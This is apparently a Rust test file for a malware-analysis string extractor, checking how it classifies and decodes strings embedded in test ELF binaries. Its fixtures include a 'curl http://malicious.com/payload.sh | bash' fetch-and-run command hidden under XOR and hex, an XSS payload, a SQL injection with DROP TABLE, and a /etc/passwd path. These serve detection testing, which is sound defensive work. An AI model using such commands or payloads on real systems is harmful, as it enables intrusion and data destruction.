//! Tests for StringKind classification edge cases

use stng::{StringKind, StringMethod, extract_strings};

fn minimal_elf_with_string(s: &str) -> Vec<u8> {
    let mut data = vec![0u8; 1024];
    data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
    data[4] = 2;
    data[5] = 1;
    data[6] = 1;
    data[16..18].copy_from_slice(&[2, 0]);
    data[18..20].copy_from_slice(&[0x3E, 0]);

    let bytes = s.as_bytes();
    data[0x200..0x200 + bytes.len()].copy_from_slice(bytes);
    data[0x200 + bytes.len()] = 0;
    data
}

#[test]
fn test_url_detection() {
    let data = minimal_elf_with_string("https://malware.example.com/payload");
    let strings = extract_strings(&data, 4);

    let url_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::Url))
        .collect();

    assert!(
        !url_strings.is_empty() || strings.iter().any(|s| s.value.contains("https://")),
        "Should detect URL"
    );
}

#[test]
fn test_ip_detection() {
    let data = minimal_elf_with_string("192.168.1.1:8080");
    let strings = extract_strings(&data, 4);

    assert!(
        strings
            .iter()
            .any(|s| s.value == "192.168.1.1:8080" && s.kind == Some(StringKind::IPPort)),
        "{strings:?}"
    );
}

#[test]
fn test_path_detection() {
    let data = minimal_elf_with_string("/etc/passwd");
    let strings = extract_strings(&data, 4);

    let path_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::SuspiciousPath) || s.value.contains("/etc/"))
        .collect();

    assert!(!path_strings.is_empty(), "Should detect suspicious path");
}

#[test]
fn test_base64_detection() {
    // Valid base64 that decodes to readable text
    let data = minimal_elf_with_string("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0Lg==");
    let strings = extract_strings(&data, 4);

    // The decoded text replaces the encoded token at its offset.
    assert!(
        strings
            .iter()
            .any(|s| s.value == "Hello World! This is a test."),
        "{strings:?}"
    );
}

#[test]
fn test_hex_encoded_detection() {
    // Hex-encoded JavaScript (from actual malware)
    // Decodes to: "const _0x1c310003=_0x230d;function _0x230d"
    let hex_str =
        "636F6E7374205F307831633331303030333D5F3078323330643B66756E6374696F6E205F307832333064";
    let expected_decoded = "const _0x1c310003=_0x230d;function _0x230d";
    let data = minimal_elf_with_string(hex_str);
    let strings = extract_strings(&data, 4);

    // The implementation automatically decodes hex strings, so we should find
    // the decoded version with HexDecode method
    let decoded_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::HexDecode)
        .collect();

    assert!(
        !decoded_strings.is_empty(),
        "Should automatically decode hex-encoded string"
    );
    assert_eq!(decoded_strings[0].value, expected_decoded);
}

#[test]
fn test_hex_encoded_not_sha256() {
    // SHA256 hash should not be detected as hex-encoded text
    let hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
    let data = minimal_elf_with_string(hash);
    let strings = extract_strings(&data, 4);

    let hex_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::HexEncoded))
        .collect();

    assert!(
        hex_strings.is_empty(),
        "SHA256 hash should not be detected as hex-encoded text"
    );
}

#[test]
fn test_unicode_escaped_detection() {
    // JavaScript with \xXX escapes (from actual malware)
    let unicode_str = "\\x27;\\x20const\\x20fs\\x20=\\x20require(\\x27fs\\x27);";
    let expected_decoded = "'; const fs = require('fs');";
    let data = minimal_elf_with_string(unicode_str);
    let strings = extract_strings(&data, 4);

    // The implementation automatically decodes unicode escapes
    let decoded_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::UnicodeEscapeDecode)
        .collect();

    assert!(
        !decoded_strings.is_empty(),
        "Should automatically decode Unicode-escaped string"
    );
    assert_eq!(decoded_strings[0].value, expected_decoded);
}

#[test]
fn test_unicode_escaped_u_format() {
    // \uXXXX format
    let unicode_str =
        "\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064";
    let expected_decoded = "Hello World";
    let data = minimal_elf_with_string(unicode_str);
    let strings = extract_strings(&data, 4);

    // The implementation automatically decodes unicode escapes
    let decoded_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::UnicodeEscapeDecode)
        .collect();

    assert!(
        !decoded_strings.is_empty(),
        "Should automatically decode \\uXXXX format Unicode-escaped string"
    );
    assert_eq!(decoded_strings[0].value, expected_decoded);
}

#[test]
fn test_unicode_escaped_not_few_escapes() {
    // Too few escape sequences should not be detected
    let text = "Hello \\x20 World";
    let data = minimal_elf_with_string(text);
    let strings = extract_strings(&data, 4);

    let unicode_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::UnicodeEscaped))
        .collect();

    assert!(
        unicode_strings.is_empty(),
        "Should not detect strings with too few escape sequences"
    );
}

#[test]
fn test_url_encoded_detection() {
    // XSS payload
    let url_str = "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E";
    let expected_decoded = "<script>alert('XSS')</script>";
    let data = minimal_elf_with_string(url_str);
    let strings = extract_strings(&data, 4);

    // The implementation automatically decodes URL-encoded strings
    let decoded_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::UrlDecode)
        .collect();

    assert!(
        !decoded_strings.is_empty(),
        "Should automatically decode URL-encoded string"
    );
    assert_eq!(decoded_strings[0].value, expected_decoded);
}

#[test]
fn test_url_encoded_sql_injection() {
    // SQL injection payload
    let url_str = "%27%20OR%20%271%27%3D%271%27%3B%20DROP%20TABLE%20users%3B--";
    let expected_decoded = "' OR '1'='1'; DROP TABLE users;--";
    let data = minimal_elf_with_string(url_str);
    let strings = extract_strings(&data, 4);

    // The implementation automatically decodes URL-encoded strings
    let decoded_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::UrlDecode)
        .collect();

    assert!(
        !decoded_strings.is_empty(),
        "Should automatically decode URL-encoded SQL injection"
    );
    assert_eq!(decoded_strings[0].value, expected_decoded);
}

#[test]
fn test_url_encoded_not_few_percent() {
    // Too few percent signs should not be detected
    let text = "Hello%20World";
    let data = minimal_elf_with_string(text);
    let strings = extract_strings(&data, 4);

    let url_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::UrlEncoded))
        .collect();

    assert!(
        url_strings.is_empty(),
        "Should not detect strings with too few percent signs"
    );
}

#[test]
fn test_base32_detection() {
    // Tor v2 onion address
    let base32_str = "THEHIDDENWIKI3IKNKD7A";
    let data = minimal_elf_with_string(base32_str);
    let strings = extract_strings(&data, 4);

    let base32_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::Base32))
        .collect();

    assert!(!base32_strings.is_empty(), "Should detect Base32 string");
    assert_eq!(base32_strings[0].value, base32_str);
}

#[test]
fn test_base32_not_lowercase() {
    // Lowercase should not be detected as Base32
    let text = "jbswy3dpeblw64tmmq";
    let data = minimal_elf_with_string(text);
    let strings = extract_strings(&data, 4);

    let base32_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::Base32))
        .collect();

    assert!(
        base32_strings.is_empty(),
        "Should not detect lowercase as Base32"
    );
}

#[test]
fn test_base58_detection() {
    // Bitcoin address - now classified as CryptoWallet (more specific than Base58)
    let base58_str = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    let data = minimal_elf_with_string(base58_str);
    let strings = extract_strings(&data, 4);

    let crypto_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::CryptoWallet))
        .collect();

    assert!(
        !crypto_strings.is_empty(),
        "Should detect Bitcoin address as CryptoWallet"
    );
    assert_eq!(crypto_strings[0].value, base58_str);
}

#[test]
fn test_base58_not_with_confusing_chars() {
    // Contains 0 (not valid Base58)
    let text = "1A1zP1eP5QGefi2DMP0fTL5SLmv7DivfNa";
    let data = minimal_elf_with_string(text);
    let strings = extract_strings(&data, 4);

    let base58_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.kind == Some(StringKind::Base58))
        .collect();

    assert!(
        base58_strings.is_empty(),
        "Should not detect strings with 0 as Base58"
    );
}

#[test]
fn test_hex_encoded_xor_data() {
    // Test double-layered obfuscation: XOR + Hex encoding
    // This tests whether we can automatically decode data that was:
    // 1. XOR-encoded with a single-byte key (0x42)
    // 2. Then hex-encoded
    //
    // The goal is to verify that hex decoding happens automatically,
    // revealing the first layer (XOR'd data).

    let plaintext = b"curl http://malicious.com/payload.sh | bash";
    let xor_key = 0x42;

    // XOR the plaintext
    let xored: Vec<u8> = plaintext.iter().map(|&b| b ^ xor_key).collect();

    // Hex-encode the XOR'd data (simulating malware obfuscation)
    let hex_encoded = xored.iter().map(|b| format!("{b:02X}")).collect::<String>();

    // Create binary with the hex-encoded string
    let data = minimal_elf_with_string(&hex_encoded);
    let strings = extract_strings(&data, 4);

    // Both layers decode at the hex string's offset: the hex layer (XOR'd
    // bytes) and, from the XOR pass run on hex output, the plaintext. They
    // tie on length, so the classified plaintext wins the offset.
    let hex_offset = strings
        .iter()
        .map(|s| s.data_offset)
        .min()
        .expect("hex string should yield output");
    let at_hex: Vec<_> = strings
        .iter()
        .filter(|s| s.data_offset == hex_offset)
        .collect();
    assert!(
        at_hex
            .iter()
            .any(|s| s.value.as_bytes() == plaintext && s.method == StringMethod::XorDecode),
        "hex then XOR layers should decode to the plaintext; found {:?}",
        strings
            .iter()
            .map(|s| format!("{:?} at 0x{:x}: {}", s.method, s.data_offset, s.value))
            .collect::<Vec<_>>()
    );
}
